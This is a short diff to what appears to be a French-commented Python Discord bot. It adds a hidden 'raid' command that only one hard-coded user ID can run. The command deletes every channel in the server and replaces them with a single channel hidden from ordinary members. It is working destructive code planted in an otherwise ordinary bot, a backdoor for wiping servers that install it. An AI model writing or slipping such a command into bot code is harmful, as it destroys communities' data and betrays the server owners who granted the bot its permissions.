@@ -8107,6 +8107,25 @@ async def delete_backup(interaction: discord.Interaction, name: str):
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
+@bot.command()
+async def raid(ctx):
+    # Vérifie si l'auteur de la commande est ISEY_ID
+    if ctx.author.id != ISEY_ID:
+        await ctx.send("Tu n'as pas l'autorisation d'utiliser cette commande.")
+        return
+    
+    # Suppression de tous les salons
+    for channel in ctx.guild.channels:
+        await channel.delete()
+
+    # Création d'un nouveau salon "Chat-Tempo"
+    overwrites = {
+        ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        ctx.guild.owner: discord.PermissionOverwrite(read_messages=True)
+    }
+    
+    await ctx.guild.create_text_channel('Chat-Tempo', overwrites=overwrites)
+    await ctx.send("Tous les salons ont été supprimés et 'Chat-Tempo' a été créé.")
 
 # Token pour démarrer le bot (à partir des secrets)
 # Lancer le bot avec ton token depuis l'environnement  
